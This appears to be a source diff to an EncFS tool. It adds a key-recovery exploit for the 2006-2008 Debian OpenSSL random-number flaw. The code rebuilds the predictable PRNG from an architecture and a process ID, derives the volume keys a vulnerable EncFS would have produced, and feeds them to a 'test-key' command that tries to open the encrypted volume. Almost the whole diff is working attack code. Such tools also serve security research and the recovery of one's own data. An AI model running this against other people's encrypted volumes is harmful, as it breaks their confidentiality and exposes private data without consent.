@@ -45,6 +45,12 @@
 #include "i18n.h"
 #include "intl/gettext.h"
 
+extern "C" {
+#include "botched_rand.h"
+BOTCHED_RAND_FUNCS(i386_);
+BOTCHED_RAND_FUNCS(amd64_);
+}
+
 #ifndef PATH_MAX
 #define PATH_MAX 4096
 #endif
@@ -563,8 +569,224 @@ static int ckpasswdAutomaticly(int argc, char **argv) {
   return do_chpasswd(true, false, true, argc, argv);
 }
 
+static void println_buf(unsigned char *buf, int len) {
+	for (int i = 0; i < len; i++) {
+		printf("%02x ", buf[i]);
+	}
+	printf("\n");
+}
 
 
+/**
+ * Possible architectures for the vulnerable OpenSSL libraries.
+ * Not sure if there is any effect other than the size of (unsigned) long...
+ */
+enum Architecture { Arch_i386, Arch_amd64 };
+
+/**
+ * "Interface" for parametrized PRNGs (the P stands for "predictable").
+ *
+ * Implementations should provide additional methods to reset the RNG to its
+ * initial state, given some parameters.
+ */
+class PredictableRNG {
+public:
+	/**
+	 * Generate the next batch of random bytes.
+	 */
+	virtual int rand_bytes(unsigned char *buf, int num) = 0;
+};
+
+/**
+ * RNGs based on the OpenSSL versions that Debian included 2006-2008
+ *
+ * FIXME Currently the class itself has no state but it manipulates the global
+ * state of botched_rand_*.c instead; never operate on more than one instance
+ * at a time
+ */
+class DebianPRNG : public PredictableRNG {
+public:
+	DebianPRNG(Architecture arch) {
+		_arch = arch;
+	}
+
+	/**
+	 * Reinitialize the RNG using the given process ID.
+	 */
+	void reset(pid_t pid) {
+		switch (_arch) {
+			case Arch_i386:  i386_b_rand_reset(pid);  break;
+			case Arch_amd64: amd64_b_rand_reset(pid); break;
+			default: rAssert(false);
+		}
+	}
+
+	virtual int rand_bytes(unsigned char *buf, int num) {
+		switch (_arch) {
+			case Arch_i386:  return i386_ssleay_rand_bytes(buf, num);
+			case Arch_amd64: return amd64_ssleay_rand_bytes(buf, num);
+			default: rAssert(false); return 0;
+		}
+	}
+
+private:
+	Architecture _arch;
+};
+
+/**
+ * "Interface" for key generators, possibly having some parameter that makes
+ * the key predictable. The generator will always output the key bytes that
+ * EncFS would have generated using these parameters.
+ *
+ * Mandatory parameter is the number of key bytes (depends on the cipher used).
+ * Optional parameters are implementation-dependent.
+ */
+class KeyGenerator {
+public:
+	/**
+	 * Generate random keybytes using the parameters of this key generator,
+	 * for the given number of bytes.
+	 */
+	virtual void generateKeybytes(unsigned char *buf, int num) = 0;
+};
+
+// from EncFS SSL_Cipher.cpp
+int BytesToKey(int keyLen, int ivLen, const EVP_MD *md, unsigned char *data, int dataLen, unsigned int rounds, unsigned char *out_keyiv) {
+  if (data == NULL || dataLen == 0) {
+    return 0;  // OpenSSL returns nkey here, but why?  It is a failure..
+  }
+
+  unsigned char mdBuf[EVP_MAX_MD_SIZE];
+  unsigned int mds = 0;
+  int addmd = 0;
+  int nkeyiv = keyLen + ivLen;
+
+  EVP_MD_CTX *cx = EVP_MD_CTX_new();
+  EVP_MD_CTX_init(cx);
+
+  for (;;) {
+    EVP_DigestInit_ex(cx, md, NULL);
+    if ((addmd++) != 0) {
+      EVP_DigestUpdate(cx, mdBuf, mds);
+    }
+    EVP_DigestUpdate(cx, data, dataLen);
+    EVP_DigestFinal_ex(cx, mdBuf, &mds);
+
+    for (unsigned int i = 1; i < rounds; ++i) {
+      EVP_DigestInit_ex(cx, md, NULL);
+      EVP_DigestUpdate(cx, mdBuf, mds);
+      EVP_DigestFinal_ex(cx, mdBuf, &mds);
+    }
+
+    int offset = 0;
+    int toCopy = nkeyiv < (int)mds - offset ? nkeyiv : (int)mds - offset;
+    if (toCopy != 0) {
+      memcpy(out_keyiv, mdBuf + offset, toCopy);
+      out_keyiv += toCopy;
+      nkeyiv -= toCopy;
+      offset += toCopy;
+    }
+    if (nkeyiv == 0) {
+      break;
+    }
+  }
+  EVP_MD_CTX_free(cx);
+  OPENSSL_cleanse(mdBuf, sizeof(mdBuf));
+
+  return keyLen;
+}
+
+class EncfsShaOnDebianKeygen : public KeyGenerator {
+public:
+	/**
+	 * Constructs a key generator that generates the exact same keys as an
+	 * EncFS with vulnerable OpenSSL, running on the given architecture.
+	 *
+	 * The parameter initialSrandBytes indicates how many bytes to initially
+	 * request from the PRNG (some EncFS versions requested a few bytes and
+	 * fed them to srand()).
+	 */
+	EncfsShaOnDebianKeygen(Architecture arch, int initialSrandBytes) {
+		_arch = arch;
+		_initialSrandBytes = initialSrandBytes;
+		_prng = new DebianPRNG(arch);
+	}
+
+	/**
+	 * Set a new process ID to use for future keys.
+	 */
+	void setPID(pid_t pid) {
+		_pid = pid;
+	}
+
+	virtual void generateKeybytes(unsigned char *buf, int num) {
+		/* Assume a freshly started EncFS process */
+		_prng->reset(_pid);
+		/* Some versions put some random bytes into srand() ... */
+		if (_initialSrandBytes > 0) {
+			unsigned char *x = (unsigned char*) alloca(_initialSrandBytes);
+			_prng->rand_bytes(x, _initialSrandBytes);
+		}
+		/* The next call to newRandomKey() would first request 32 bytes (MAX_KEYLENGTH) */
+		unsigned char ibuf[32];
+		_prng->rand_bytes(ibuf, 32);
+		/* But these were not directly used as keybytes. but were fed
+		 * into the BytesToKey function for hashing instead
+		 * (first two args were keylen and ivlen but these are
+		 * contiguous anyway, so we just provide their sum as
+		 * total len + 0
+		 */
+		int bytes __attribute__((unused)) = BytesToKey(num, 0, EVP_sha1(), ibuf, 32, 16, buf);
+	}
+
+private:
+	Architecture _arch;
+	int _initialSrandBytes;
+	DebianPRNG *_prng;
+	pid_t _pid;
+};
+
+static void parseKeyFromArgs(char *args[], int nargs, unsigned char *out_buf, int nkeybytes) {
+	if (nargs < 1) {
+		cerr << "Key expected, but no arguments given.\n";
+		exit(EXIT_FAILURE);
+	}
+
+	if (!strcmp(args[0], "raw")) {
+		if (nargs - 1 != nkeybytes) {
+			cerr << "Expected " << nkeybytes << " bytes of key material but " << (nargs - 1) << " bytes have been provided as arguments\n";
+			exit(EXIT_FAILURE);
+		}
+		for (int i = 0; i < nkeybytes; i++) {
+			long cur = strtol(args[1+i], NULL, 16);
+			out_buf[i] = cur & 0xff;
+		}
+	} else if (!strcmp(args[0], "esd")) {
+		if (nargs != 4) {
+			cerr << "Expected exactly three arguments (architecture, srand bytes, process id)\n";
+			exit(EXIT_FAILURE);
+		}
+
+		Architecture arch;
+		if (!strcmp(args[1], "i386")) {
+			arch = Arch_i386;
+		} else if (!strcmp(args[1], "amd64")) {
+			arch = Arch_amd64;
+		} else {
+			cerr << "Unknown architecture \"" << args[1] << "\"\n";
+			exit(EXIT_FAILURE);
+		}
+		long srandBytes = strtol(args[2], NULL, 10);
+		long pid = strtol(args[3], NULL, 10);
+
+		EncfsShaOnDebianKeygen keygen(arch, srandBytes);
+		keygen.setPID(pid);
+		keygen.generateKeybytes(out_buf, nkeybytes);
+	} else {
+		cerr << "Unknown key type \"" << args[0] << "\"\n";
+		exit(EXIT_FAILURE);
+	}
+}
 
 
 static int list_files(RootPtr rootInfo) {
@@ -595,13 +817,6 @@ static int list_files(RootPtr rootInfo) {
   }
 
   return EXIT_SUCCESS;
-}
-
-static void println_buf(unsigned char *buf, int len) {
-	for (int i = 0; i < len; i++) {
-		printf("%02x ", buf[i]);
-	}
-	printf("\n");
 }
 
 
@@ -725,19 +940,16 @@ int main(int argc, char **argv) {
 
 		return EXIT_SUCCESS;
 	} else if (!strcmp(command, "test-key")) {
-		int buflen = argc - 2;
-		unsigned char *buf = (unsigned char*) malloc(sizeof(unsigned char) * buflen);
-		for (int i = 0; i < buflen; i++) {
-			long cur = strtol(argv[2+i], NULL, 16);
-			buf[i] = cur & 0xff;
-		}
+		int keylen = cipher->rawKeySize();
+		unsigned char *keybytes = (unsigned char*) malloc(keylen);
+		parseKeyFromArgs(argv+2, argc-2, keybytes, keylen);
 
 		std::shared_ptr<EncFS_Opts> opts(new EncFS_Opts());
 		opts->rootDir = rootDir;
 		opts->createIfNotFound = false;
 		opts->checkKey = false; // meaningless anyway, we can only *guess* if it's the correct key
-		opts->volumeKeyData = buf;
-		opts->volumeKeyLen = buflen;
+		opts->volumeKeyData = keybytes;
+		opts->volumeKeyLen = keylen;
 		RootPtr rootPtr = initFS(ctx.get(), opts);
 		if (!rootPtr) {
 			cerr << "Unable to open " << rootDir << " as an EncFS volume\n";
